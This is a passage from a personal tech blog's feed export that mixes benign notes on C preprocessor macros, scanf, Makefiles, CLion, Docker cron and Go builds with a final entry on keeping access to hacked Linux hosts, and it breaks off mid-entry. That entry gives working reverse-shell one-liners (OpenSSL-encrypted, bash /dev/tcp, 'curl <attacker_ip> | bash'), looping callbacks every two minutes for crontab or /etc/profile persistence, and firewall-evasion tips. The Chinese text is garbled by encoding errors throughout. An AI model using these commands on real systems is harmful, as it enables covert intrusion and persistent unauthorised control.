å®é™…ä¸Šå¹¶æ²¡æœ‰ç»™ GRAPH_H èµ‹äºˆä¸€ä¸ªå…·ä½“çš„å€¼ã€‚å®ƒåªæ˜¯å®šä¹‰äº†ä¸€ä¸ªå®ï¼Œè¿™ä¸ªå®çš„å­˜åœ¨ä¸å¦æ˜¯å®ƒçš„å”¯ä¸€ç›®çš„ã€‚// å¤´æ–‡ä»¶å†…å®¹ï¼Œä¾‹å¦‚å‡½æ•°å£°æ˜å’Œå˜é‡å£°æ˜void myFunction();extern int myVariable;#endif // GRAPH_H</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>if-endif</title>
      <link href="/2024/09/10/Cpp/if-endif/"/>
      <url>/2024/09/10/Cpp/if-endif/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ Data stucture and Algorithm çš„ git é¡¹ç›®å­¦åˆ°çš„ï¼š</p><p>è¿™å¦‚æœæ˜¯<code>0</code>ï¼Œå°±æ˜¯<strong>çœŸæ³¨é‡Š</strong>ï¼Œä»£ç ä¸è¿è¡Œï¼Œå¦‚æœæ˜¯<code>1</code>ï¼Œ<strong>ä»£ç è¿è¡Œ</strong></p><pre><code>#if 0#endif</code></pre><p>å¦‚ï¼š</p><pre><code>#if 1int IsLess(int a, int b) &#123;    return a &lt; b;&#125;int IsLarger(int a, int b) &#123;    return a &gt; b;&#125;// Define a function pointer type, which points to a functiontypedef int (*ComparatorFuncPtr)(int, int);void BubbleSort2(int *ptr, int n, ComparatorFuncPtr compare) &#123;    for (int iMax = n - 2; iMax &gt;= 0; iMax--) &#123;        for (int i = 0; ____Q1_____; _____Q2____) &#123;            if (_____Q3_____) &#123;                ____Q4____;            &#125;        &#125;           &#125;&#125;int TestBubbleSort2(void) &#123;        int arr[] = &#123;30, 50, 20, 10, 60, 40&#125;;    int len = sizeof(arr) / sizeof(arr[0]);    // a function pointer variable which points to the function IsLarger()    ComparatorFuncPtr fptr = &amp;IsLarger;        printf(&quot;Before sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in ascending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    // a function pointer variable which points to the function IsLess()    fptr = ____Q5____;        printf(&quot;\nBefore sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in descending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    return 0;&#125;#endif</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>how double scanf to eat the line</title>
      <link href="/2024/09/10/Cpp/how-double-scanf-to-eat-the-line/"/>
      <url>/2024/09/10/Cpp/how-double-scanf-to-eat-the-line/</url>
      
        <content type="html"><![CDATA[<p>ä¸¤ä¸ªscanfç›¸æŒ¨ï¼Œ<strong>è‹¥ç¬¬äºŒä¸ªscanfæ¥å—å•ä¸ªcharç±»å‹</strong>ï¼Œä¼šé”™è¯¯èµ‹å€¼<strong>\n</strong></p><pre><code>Scanf(&lt;é˜¿çŒ«é˜¿ç‹—æ¥å—ä»€ä¹ˆéƒ½è¡Œ&gt;)Scanf(â€œ%câ€, &amp;char2)</code></pre><p>ç»è¿‡è°ƒè¯•ï¼Œæ¯”å¦‚æˆ‘è¾“å…¥<code>a\nb</code>(æ­¤å¤„<code>\n</code>æ˜¯Enterçš„å›è½¦)ï¼Œä¼šå‘ç°ç¬¬äºŒä¸ª<code>scanf(â€œ%câ€, &amp;char2)</code>æ¥å—çš„æ˜¯å­—ç¬¦<code>\n</code>ï¼Œè€Œé<code>b</code>ã€‚å› æ­¤åˆ¤å®šï¼ŒæŒ‰ä¸‹Enterä¼šå½±å“ç¬¬äºŒä¸ªscanfçš„è¾“å…¥ï¼Œä¼šä½¿å¾—ç¬¬äºŒä¸ªscanfæ˜¯å›è½¦å­—ç¬¦ã€‚</p><p>scanfã€getcharã€fgetsç­‰æ˜¯æ¥å—<strong>æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰</strong>çš„å‡½æ•°ï¼Œå¦‚æœåé¢ä¹Ÿæœ‰æ¥å—æ ‡å‡†è¾“å…¥çš„å‡½æ•°ï¼Œè®°å¾—<code>getchar</code>å»åƒæ‰é‚£ä¸ªå­—ç¬¦ã€‚</p><h1 id="å¤„ç†æ–¹æ³•ä¸€"><a href="#å¤„ç†æ–¹æ³•ä¸€" class="headerlink" title="å¤„ç†æ–¹æ³•ä¸€"></a>å¤„ç†æ–¹æ³•ä¸€</h1><p>å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨getchar()åƒè¿™ä¸ªâ€™\nâ€™ï¼Œä½†æ˜¯ä¸éœ€è¦ç»™å…¶ä»–å˜é‡èµ‹å€¼ï¼Œå› ä¸ºè¿™ä¸ªâ€™\nâ€™æœ¬èº«æ²¡ç”¨ã€‚</p><pre><code>Scanf(â€œ%câ€, &amp;char1)Getchar();Scanf(â€œ%câ€, &amp;char2)</code></pre><h1 id="å¤„ç†æ–¹æ³•äºŒ"><a href="#å¤„ç†æ–¹æ³•äºŒ" class="headerlink" title="å¤„ç†æ–¹æ³•äºŒ"></a>å¤„ç†æ–¹æ³•äºŒ</h1><p>å¦ä¸€ä¸ªæ–¹æ³•ï¼Œæ˜¯ç¬¬äºŒä¸ª<code>scanf(&quot; %c&quot;, &amp;char2)</code>,æ³¨æ„<code>&quot; %c&quot;</code>å‰é¢æœ‰ä¸ª<strong>ç©ºæ ¼</strong>ã€‚</p><p>æ®æˆ‘æ¨æµ‹ï¼Œè¿™ä¸ªæ–¹æ³•åˆ©ç”¨äº†scanfæ¥å—æ•°æ®å¹¶éä¸¥æ ¼æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å…¥çš„ç‰¹æ€§ã€‚</p><p>æ¯”å¦‚ <code>scanf(â€œ%d %dâ€, &amp;a, &amp;b)</code>, è¾“å…¥<code>1 2ï¼Œ1+2</code>ï¼Œéƒ½å¯ä»¥æ­£å¸¸é€šè¿‡scanfç»™a,bä¸¤ä¸ªå˜é‡èµ‹å€¼ï¼Œä¸ä¸€å®šè¦ä¸¥æ ¼â€1 2â€ä»¥ç©ºæ ¼åˆ†éš”ã€‚</p><p><code>scanf(&quot; %c&quot;, &amp;char2)</code> åº”è¯¥åˆ©ç”¨äº†<code>scanf</code>ä¸ä¸¥æ ¼ç‰¹æ€§ï¼Œæ¥åƒæ‰é‚£ä¸ªEnterã€‚</p>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CmakeLists.txt</title>
      <link href="/2024/09/10/Cpp/CmakeLists-txt/"/>
      <url>/2024/09/10/Cpp/CmakeLists-txt/</url>
      
        <content type="html"><![CDATA[<p>Normally we have two methods to compile and build the C/CPP projects: makefile and cmakelist.</p><p>Havenâ€™t researched this yet. But I know how to run a project by <code>CmakeLists.txt</code>. Please refer to <em>Clion Debug Trick</em>.</p><ul><li><a href="#how-to-prepare-compilation-and-build">how to prepare compilation and build</a></li><li><a href="#cmake-project">CMake project</a></li><li><a href="#makefile-project">Makefile project</a></li></ul><h1 id="how-to-prepare-compilation-and-build"><a href="#how-to-prepare-compilation-and-build" class="headerlink" title="how to prepare compilation and build"></a>how to prepare compilation and build</h1><pre><code>sudo apt update</code></pre><h1 id="CMake-project"><a href="#CMake-project" class="headerlink" title="CMake project"></a>CMake project</h1><p>CMakeLists.txtæ–‡ä»¶é€šå¸¸è¦æ±‚cmakeå‘½ä»¤</p><pre><code>sudo apt install cmake cmake â€“versioncmake</code></pre><p>ç°åœ¨é€šå¸¸åœ¨Makefileæ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°cmakeå‘½ä»¤ã€‚cmakeä¼šæ‰§è¡ŒCMakeLists.txtä¸­çš„æŒ‡ä»¤ï¼Œç”ŸæˆMakefileæ–‡ä»¶ã€‚</p><h1 id="Makefile-project"><a href="#Makefile-project" class="headerlink" title="Makefile project"></a>Makefile project</h1><pre><code>make</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Makefile</title>
      <link href="/2024/09/10/Cpp/Makefile/"/>
      <url>/2024/09/10/Cpp/Makefile/</url>
      
        <content type="html"><![CDATA[<p>Normally we have two methods to compile and build the C/CPP projects: makefile and cmakelist.</p><ul><li><a href="#comp9024-makefile">COMP9024 makefile</a><ul><li><a href="#deps-macro">DEPS Macro:</a></li><li><a href="#o-file-rule-object-files">.o File Rule (Object Files):</a><ul><li><a href="#rule-structure">Rule Structure</a></li><li><a href="#key-parts">Key Parts</a></li><li><a href="#special-macros--and-">Special Macros <code>$@</code> and <code>$^</code>:</a></li><li><a href="#final-example">Final Example:</a></li></ul></li></ul></li></ul><h1 id="COMP9024-makefile"><a href="#COMP9024-makefile" class="headerlink" title="COMP9024 makefile"></a>COMP9024 makefile</h1><pre><code>#####################################################################################                 How to Use# # (1) Build the project#   make# (2) Run the executable#   ./main# (3) Clean the project#   make clean## If you want to know more about makefile, please refer to:##    https://www.gnu.org/software/make/manual/html_node/Rule-Syntax.html## You can reuse this Makefile in different assignments/projects in COMP9024.# To be simple, please put your *.c and *.h in the src directory.##                                                                 COMP9024####################################################################################PROJ_ROOT_PATH = $(shell pwd)TARGET_EXE = mainBUILD_DIR = buildC_SRC_FILES = $(shell find ./src -name &quot;*.c&quot;)H_SRC_FILES = $(shell find ./src -name &quot;*.h&quot;)# src/*.c  ---&gt;  src/*.o ---&gt; build/*.oTMP_OBJ_FILES = $(C_SRC_FILES:.c=.o)OBJ_FILES_IN_BUILD =$(subst src/,$(BUILD_DIR)/,$(TMP_OBJ_FILES))CC= gcc#CFLAGS = -m32 -g -no-pie --save-temps -I $(PROJ_ROOT_PATH)/src#CFLAGS = -g --save-temps -I $(PROJ_ROOT_PATH)/src#CFLAGS = -no-pie --save-temps -fno-asynchronous-unwind-tables -I $(PROJ_ROOT_PATH)/src CFLAGS = -g -Wall -I $(PROJ_ROOT_PATH)/src # create a directory  $(shell mkdir -p $(BUILD_DIR))# the default targetall:     make $(TARGET_EXE)# generate the target, which depends on the &quot;build/*.o&quot; files$(TARGET_EXE):  $(OBJ_FILES_IN_BUILD)         $(CC) $(CFLAGS) -o $(TARGET_EXE) $(OBJ_FILES_IN_BUILD)# How to generate a &quot;build/*.o&quot; from a &quot;src/*.c&quot;# To generate prerequisites automatically, please see COMP9024/C/HowToMake/Makefile.V2# https://www.gnu.org/software/make/manual/html_node/Automatic-Prerequisites.html$(BUILD_DIR)/%.o: src/%.c $(H_SRC_FILES)    @mkdir -p $(shell dirname $@)    $&#123;CC&#125; $&#123;CFLAGS&#125; -c $&lt; -o $@view:    find ./images -name &quot;*.png&quot; | sort | xargs feh -g 1024x768  &amp;# clean all the files generated    clean:    rm -rf $(TARGET_EXE) $(BUILD_DIR)     find . -name &quot;*.o&quot; | xargs rm -f    find . -name &quot;*.s&quot; | xargs rm -f    find . -name &quot;*.i&quot; | xargs rm -f    find . -name &quot;*.d&quot; | xargs rm -f    find . -name &quot;*.bc&quot; | xargs rm -f</code></pre><h2 id="DEPS-Macro"><a href="#DEPS-Macro" class="headerlink" title="DEPS Macro:"></a>DEPS Macro:</h2><ul><li><p>DEPS is a macro (or variable) that stores the dependencies for the .c files, typically the .h (header) files.</p></li><li><p>In a C program, .c files (source files) often depend on .h files (header files) for declarations, so they must be recompiled whenever the header files change.</p></li><li><p>By listing the header files in DEPS, you ensure that if any header file changes, the corresponding .c file will be recompiled.</p></li></ul><pre><code class="lang-makefile">DEPS = file1.h file2.h file3.h</code></pre><h2 id="o-File-Rule-Object-Files"><a href="#o-File-Rule-Object-Files" class="headerlink" title=".o File Rule (Object Files):"></a>.o File Rule (Object Files):</h2><ul><li><p>The .o files are object files (compiled but not yet linked), which are created from .c files.</p></li><li><p>This rule applies to any file ending with .o, meaning itâ€™s a generic rule that works for all object files.</p></li></ul><h3 id="Rule-Structure"><a href="#Rule-Structure" class="headerlink" title="Rule Structure"></a>Rule Structure</h3><pre><code class="lang-makefile">Copy code%.o: %.c $(DEPS)$(CC) -c -o $@ $&lt; $(CFLAGS)</code></pre><p><code>%.o: %.c $(DEPS)</code>: This line specifies that to create an <code>.o</code> file (e.g., <code>main.o</code>), you need the corresponding <code>.c</code> file (e.g., main.c) and any header files defined in DEPS.</p><h3 id="Key-Parts"><a href="#Key-Parts" class="headerlink" title="Key Parts"></a>Key Parts</h3><ul><li><code>$(CC)</code>: The macro that holds the compiler (usually gcc or clang).</li><li><code>-c</code>: Tells the compiler to generate an object file (.o) rather than a final executable.</li><li><code>-o $@</code>: The -o flag tells the compiler where to put the output. The $@ is a special macro that stands for the target file, i.e., the .o file.</li><li><code>$&lt;</code>: This is another special macro that represents the first dependency in the list. In this case, itâ€™s the .c file.</li><li><code>$(CFLAGS)</code>: Compiler flags used for things like optimization or warnings.</li></ul><h3 id="Special-Macros-and"><a href="#Special-Macros-and" class="headerlink" title="Special Macros $@ and $^:"></a>Special Macros <code>$@</code> and <code>$^</code>:</h3><p>These macros simplify rules in Makefiles:</p><ul><li><p><code>$@</code>: Represents the target file (left of the :), so in %.o: %.c, $@ is the .o file.</p></li><li><p><code>$^</code>: Represents all of the dependencies (right of the :), so it expands to both the .c file and the $(DEPS) files.</p></li></ul><p>This makes the rule more general, so it can handle multiple dependencies easily.</p><h3 id="Final-Example"><a href="#Final-Example" class="headerlink" title="Final Example:"></a>Final Example:</h3><p>Hereâ€™s how the Makefile might look with these macros:</p><pre><code class="lang-makefile">Copy codeCC = gccCFLAGS = -Wall -g  # Compiler flags for warnings and debuggingDEPS = file1.h file2.hOBJ = main.o otherfile.o%.o: %.c $(DEPS)    $(CC) -c -o $@ $&lt; $(CFLAGS)myprogram: $(OBJ)    $(CC) -o $@ $^ $(CFLAGS)clean:    rm -f *.o myprogram</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Clion Debug Trick</title>
      <link href="/2024/09/10/Cpp/Clion-Debug-Trick/"/>
      <url>/2024/09/10/Cpp/Clion-Debug-Trick/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#output-is-missing-during-debug">Output is missing During Debug</a><ul><li><a href="#method-1-insert-output-buf-code">Method 1 insert output buf code</a></li><li><a href="#method-2-external-terminal-during-debugrecommended">Method 2 external terminal during debug(Recommended)</a></li></ul></li><li><a href="#how-to-run-comp9024-in-clion">How to run COMP9024 in Clion</a><ul><li><a href="#for-single-c-file">for single C file</a></li><li><a href="#for-multiple-c-and-h-files">for multiple .c and .h files</a></li></ul></li></ul><h1 id="Output-is-missing-During-Debug"><a href="#Output-is-missing-During-Debug" class="headerlink" title="Output is missing During Debug"></a>Output is missing During Debug</h1><p><img src="/2024/09/10/Cpp/Clion-Debug-Trick/2024-10-30-13-06-01.png" alt></p><p>This is because of the Clionâ€™s console terminal, it has a large buff of output.</p><p>How to fix it?</p><h2 id="Method-1-insert-output-buf-code"><a href="#Method-1-insert-output-buf-code" class="headerlink" title="Method 1 insert output buf code"></a>Method 1 insert output buf code</h2><p>At the beginning of the text file, add the code below:</p><p><code>setbuf(stdout, 0);</code></p><h2 id="Method-2-external-terminal-during-debug-Recommended"><a href="#Method-2-external-terminal-during-debug-Recommended" class="headerlink" title="Method 2 external terminal during debug(Recommended)"></a>Method 2 external terminal during debug(Recommended)</h2><p>Edit the run configuration</p><p><img src="/2024/09/10/Cpp/Clion-Debug-Trick/2024-10-30-13-07-20.png" alt></p><p>Tick on the â€œRun in external consoleâ€, and click â€œApplyâ€</p><p><img src="/2024/09/10/Cpp/Clion-Debug-Trick/2024-10-30-13-08-04.png" alt></p><h1 id="How-to-run-COMP9024-in-Clion"><a href="#How-to-run-COMP9024-in-Clion" class="headerlink" title="How to run COMP9024 in Clion"></a>How to run COMP9024 in Clion</h1><p>æˆ‘åœ¨windowsä¸Šï¼Œå› æ­¤ç¼–è¯‘Cé¡¹ç›®æˆ‘è‡ªå·±æ²¡æœ‰ä½¿ç”¨é»˜è®¤çš„makefileï¼Œè€Œæ˜¯è‡ªå·±ç”¨äº†CMakeListæ–‡ä»¶</p><p>The default build file of COMP9024 is makefile. In my way to run it in Clion, I choose to use MakeListfile to build instead of makefile.</p><p>Remember to install <code>dot</code> command, because COMP9024 often uses <code>dot</code> to deal with images to handle graphes. Please refer to the article <code>Algorithm/dot-and-graph</code>.</p><h2 id="for-single-C-file"><a href="#for-single-C-file" class="headerlink" title="for single C file"></a>for single C file</h2><p>Install the plugin named <code>C/C++ Single File Execution</code> in advance for Clion.</p><p><strong>Open the directory which containing main, rathoer not the directory containing makefile and img.</strong></p><p>Then right-click the directory from the file brower of Clion, create a new <code>CMakeList.txt</code>.</p><p>Then use the plugin function: go back to activate the tab of <code>main.c</code>, right-click and choose the item: <code>Add executable for single c/cpp file</code>.</p><p>Then <code>CMakeList.txt</code> would generate something, you need to <strong>right-click</strong> the file to <strong>Reload from the disk</strong> CMakeList project.</p><p>Finally, the configuration of the Run and Debug could run this file.</p><p>But it can only solve single c/cpp file, if you want to compile and run multiple .h and .c project, please refer the next section.</p><h2 id="for-multiple-c-and-h-files"><a href="#for-multiple-c-and-h-files" class="headerlink" title="for multiple .c and .h files"></a>for multiple .c and .h files</h2><p>Clear the context of <code>CMakeList.txt</code>, then input manually:</p><pre><code>file(GLOB SOURCES &quot;*.c&quot;)add_executable(main $&#123;SOURCES&#125;)</code></pre><p>Then Clion could run the project successfully.</p>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PREFACE</title>
      <link href="/2024/08/29/readFirst/"/>
      <url>/2024/08/29/readFirst/</url>
      
        <content type="html"><![CDATA[<p>My blog has hybrid contents in English and Chinese, I prefer using English more in the future, especially Math and Commupter Technical fields. Sometimes I would write some trivia articles, such as reading notes, viewing notes of some daily events, films and novels, all these trivias may be in Chinese. If you have challenges reading existed Chinese compositions, please <strong>right-click the page and translate the Chinese portion into English</strong>. And notice notably and honestly, I appreciate critiques constructively from peers for progress with gratitude. Please leave your sugesstion and deep analysis! ^_^ Just log in github account and comment below my compositions, and then I would receive notice emails from github.</p><p>Recently I just thought, I cannot always write too fundamental blog articles, because maybe many people would feel tedious and exhausted by reading too detailed articles. So I determined to sort out and integrate many unnecessary and too detailed articles into some specific big articles, and then I would display new interesting solution articles at easy reading positions.</p><p>With respect of <strong>Mathematics</strong>, I put the Math directory as the first directory.</p><p>This blog theme uses Hexo, and it is built on Git Page. The specific theme is <strong>3-hexo</strong>. If you want to mimic the blog, please refer <a href="https://github.com/yelog/hexo-theme-3-hexo">hexo-theme-3-hexo</a> and <a href="https://yelog.org/2017/03/23/3-hexo-instruction/">3-hexo-instruction</a>.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker_cron</title>
      <link href="/2024/08/29/docker/docker-cron/"/>
      <url>/2024/08/29/docker/docker-cron/</url>
      
        <content type="html"><![CDATA[<p>In the end of 2023, I developed a MCV web system and I found there was a problem: I want to use docker to build a container with crontab. But the crontab didnâ€™t work after build.</p><p>This is my before command, and it doesnâ€™t work:</p><pre><code># å¼€å¯cronå®šæ—¶ä»»åŠ¡/etc/init.d/cron restart &amp;&amp; /etc/init.d/cron status &amp;&amp; /etc/init.d/cron start</code></pre><p>This is my revision, and it works:</p><pre><code># crontabRUN echo &quot;* * * * * root cd /app/scripts/;/usr/local/bin/python /app/scripts/timer_add.py &gt;&gt; /var/log/timer.log 2&gt;&amp;1&quot; &gt;&gt; /etc/cron.d/crontab &amp;&amp; chmod 0644 /etc/cron.d/crontab &amp;&amp; /etc/init.d/cron restart &amp;&amp; /etc/init.d/cron status &amp;&amp; chmod +x /app/start.sh</code></pre><p>The critical element is the priviledges.</p><p>And I read the other solutions below, but I dont verify them.</p><p><code>/var/spool/cron/[crontabs]/&lt;username&gt;</code></p><p><strong>centos</strong> <code>/var/spool/cron/root</code></p><p><strong>Debian/Ubuntu</strong> <code>/var/spool/cron/crontabs/root</code></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>compile &amp; packaging</title>
      <link href="/2024/08/29/Go/compile/"/>
      <url>/2024/08/29/Go/compile/</url>
      
        <content type="html"><![CDATA[<p>This article contains tentatively golangâ€™s packaging techniques and UPX repackaging introduction, because both these 2 topics have small content size and Iâ€™d better merge them into one article for typesettings.</p><h1 id="Golang-Compiling-cross-platforms"><a href="#Golang-Compiling-cross-platforms" class="headerlink" title="Golang Compiling cross platforms"></a>Golang Compiling cross platforms</h1><p>Normally these commands could compile golang program:</p><pre><code>SET CGO_ENABLED=0SET GOOS=linuxSET GOARCH=amd64go build main.go</code></pre><p>Linux on x86:</p><pre><code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build</code></pre><p>Linux on arm:</p><pre><code>CGO_ENABLED=0GOOS=linuxGOARCH=armgo build filename.go</code></pre><p>Windows:</p><pre><code>CGO_ENABLED=0GOOS=windowsGOARCH=amd64go build filename.go</code></pre><p>MacOS:</p><pre><code>CGO_ENABLED=0GOOS=darwinGOARCH=amd64go build filename.go</code></pre><p>CGO is a option for unification of C,C++ and golang, it can unify C and golangâ€™s basic data struct. Its default value is 0, and if you want to set it up to 1, refer to <a href="https://stackoverflow.com/questions/64531437/why-is-cgo-enabled-1-default">https://stackoverflow.com/questions/64531437/why-is-cgo-enabled-1-default</a>. </p><p>Normally if the target executive Linux has standard <code>libc</code>, <code>glibc</code>, you donnot enable this option. If enabling CGO, and the file size after packaging would be bigger.</p><h1 id="Golang-Compiling-without-symbols"><a href="#Golang-Compiling-without-symbols" class="headerlink" title="Golang Compiling without symbols"></a>Golang Compiling without symbols</h1><p>Golangâ€™s compiling tool chain would build the binaries staticly with standard libraries and Third-party libraries. And the binaries contain runtime and GC(Garbage Collection) instructions. Normally it is hard to analyse the binaries for reverse engineering.</p><p>go build command:</p><pre><code>go build -ldflags &quot;-s -w&quot;go build -ldflags &quot;-s -w&quot; -trimpathgo build -ldflags &quot;-w -s&quot;  -o SecretDetection-lackOfOptimize.exego build -ldflags &quot;-s -w&quot; -trimpath  -o SecretDetection-lackOfOptimize.exe</code></pre><h1 id="UPX-compresses-the-binaries"><a href="#UPX-compresses-the-binaries" class="headerlink" title="UPX compresses the binaries"></a>UPX compresses the binaries</h1><p>I recommand to read the raw github and download the upstream binaries: <a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a> . In china, there are many modified UPX prevalent in many security platforms with backdoors, so that be vigilant except the original github project.</p><p>UPX is simple to use, and I dont have deeper research.</p><pre><code># Often commandupx -9 fscan.exe# The 2 commands below are possible to package with failure, and I suggest to do more tests after compressionupx --best program.exeupx --brute program.exe</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>privileges_remain</title>
      <link href="/2024/08/28/penetration/privileges-remain/"/>
      <url>/2024/08/28/penetration/privileges-remain/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#backdoor-sustainability">backdoor sustainability</a></li><li><a href="#the-most-useful-frequentlyexcerpts">the most useful frequently(excerpts)</a><ul><li><a href="#openssl-reverse-terminal-by-encryption">openSSL reverse terminal by encryption</a></li><li><a href="#simply-reverse-bash-shell">simply reverse bash shell</a></li><li><a href="#hidden-protocal-simply">hidden protocal simply</a></li></ul></li><li><a href="#multiple-methods-inclusion">multiple methods inclusion</a><ul><li><a href="#1-screen">1. screen</a></li><li><a href="#2-crontab">2. crontab</a></li><li><a href="#3-netcat">3. netcat</a></li><li><a href="#4-curl-reverse">4. curl reverse</a></li><li><a href="#5-etcprofile">5. /etc/profile</a></li><li><a href="#6-socat-reverses-shell">6. Socat reverses shell</a></li><li><a href="#7-telnet-reverses-shell">7. Telnet reverses shell</a><ul><li><a href="#method-1">Method 1</a></li><li><a href="#method-2">Method 2</a></li></ul></li><li><a href="#8-python">8. python</a></li><li><a href="#9-php">9. php</a></li><li><a href="#10-perl">10. Perl</a></li><li><a href="#11-ruby">11. Ruby</a></li><li><a href="#12-metasploit-venom">12. Metasploit venom</a></li><li><a href="#13-get-full-terminal">13. get full terminal</a></li></ul></li></ul><h1 id="backdoor-sustainability"><a href="#backdoor-sustainability" class="headerlink" title="backdoor sustainability"></a>backdoor sustainability</h1><p>This article refers to much a lot <code>Marcus_Holloway</code>â€˜s blog, the original link is <a href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488</a> . As I know, how to remain a long term privileges on hacked computers is important for cybersecurity leaners, so I want to do more researches standing on the shoulders of giants. This is a continuous-updating blog of mine for accumulating some interesting permission sustainability.</p><h1 id="the-most-useful-frequently-excerpts"><a href="#the-most-useful-frequently-excerpts" class="headerlink" title="the most useful frequently(excerpts)"></a>the most useful frequently(excerpts)</h1><h3 id="openSSL-reverse-terminal-by-encryption"><a href="#openSSL-reverse-terminal-by-encryption" class="headerlink" title="openSSL reverse terminal by encryption"></a>openSSL reverse terminal by encryption</h3><p>You can hide the network protocol and raw content for avoiding firewall detection.</p><pre><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodesoropenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 10000 -nodes# normally the commands need your a lot input as its additional description and messages, but you can only press Enter thoroughly for convenience</code></pre><p>Sometimes you may think can we generate a unlimited days expiry, but sadly it cannot generate a Asymetric secrets without specific expiry. However, you can point a very huge days as its expiry, but normally the clients would not trust such a secret certificate because of the too massive number, such as browers. Normally you can generate one year or 3 years as its expiry.</p><p>Parameters:</p><ul><li>req: create and deal with certificate</li><li>-x509: it is a self-signed certificate, rather than certificate signing request(CSR)</li><li>-newkey rsa:2048: generate a new RSA private secret, and demand the length of the secret is 2048 bit.</li><li>-keyout key.pem: set up the private keyâ€™s output path</li><li>-out cert.pem: set up the certificate (public key)â€™s output path</li><li>-days 365: expiry time is 365 days</li><li>-nodes: the generated private key doesnâ€™t need secert protection</li></ul><p>Use the attackerâ€™s VPS listens on port 2333:</p><pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</code></pre><p>It creates a SSL/TLS server on 2333 port, and then execute the command on hacked host to reverse its shell:</p><pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;VPS_IP&gt;:2333 &gt; /tmp/s; rm /tmp/s</code></pre><p>Then hacker would gain a shell. Sometimes you may write it into <code>/etc/profile</code>, <code>crontab</code> or <code>screen</code>, you can input such command, which makes the reverse shell connect you per 2 mins:</p><pre><code>while true; do    mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:2333 &gt; /tmp/s; rm /tmp/s    sleep 120done</code></pre><h3 id="simply-reverse-bash-shell"><a href="#simply-reverse-bash-shell" class="headerlink" title="simply reverse bash shell"></a>simply reverse bash shell</h3><p>Attackerâ€™s VPS listens on port 2333:</p><pre><code>nc -lvvp 2333</code></pre><p>Attackerâ€™s host execute such a command:</p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></pre><h3 id="hidden-protocal-simply"><a href="#hidden-protocal-simply" class="headerlink" title="hidden protocal simply"></a>hidden protocal simply</h3><p>Attacker creates <code>index.html</code> on his public server, and the raw content is:</p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></pre><p>Hacked computer executes such one command:</p><pre><code>curl &lt;attacker_ip&gt; | bash</code></pre><p>It can hide the network and the firewall may think itâ€™s only a http web stream. But other network security devices may detect its raw content!</p><h1 id="multiple-methods-inclusion"><a href="#multiple-methods-inclusion" class="headerlink" title="multiple methods inclusion"></a>multiple methods inclusion</h1><h3 id="1-screen"><a href="#1-screen" class="headerlink" title="1. screen"></a>1. screen</h3><pre><code>screen -s test</code></pre><p>è¾“å…¥</p><pre><code>while true; do    /bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1donewhile true; do    /bin/bash -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&gt;&amp;1    sleep 120done</code></pre><p>openSSLåŠ å¯†SSLåè®®åé—¨åå¼¹ä¸ç›´æ¥bash -i</p><pre><code>while true; do    mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;attacker_ip&gt;:&lt;port&gt; &gt; /tmp/s; rm /tmp/s    sleep 120done</code></pre><h3 id="2-crontab"><a href="#2-crontab" class="headerlink" title="2. crontab"></a>2. crontab</h3><ul><li><ul><li><ul><li><ul><li><ul><li>/bin/bash -i &gt;&amp; /dev/tcp/<attacker_ip>/<port> 0&gt;&amp;1</port></attacker_ip></li></ul></li></ul></li></ul></li></ul></li></ul><p>I advice if you want to write tasks into crontab, you need to check if it works in crontab. Because sometimes if you are a low priviledge, then you may have no crontab permission, even you did <code>crontab -e</code>.</p><p>We need to know our username on host, and then write into <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> , or it doesnâ€™t work. For example, I am root, then we need to write into <code>/var/spool/cron/root</code>(centos); Or <code>/var/spool/cron/crontabs/root</code> (Debian/Ubuntu)</p><h3 id="3-netcat"><a href="#3-netcat" class="headerlink" title="3. netcat"></a>3. netcat</h3><p>if hacked host has <code>netcat</code>, then 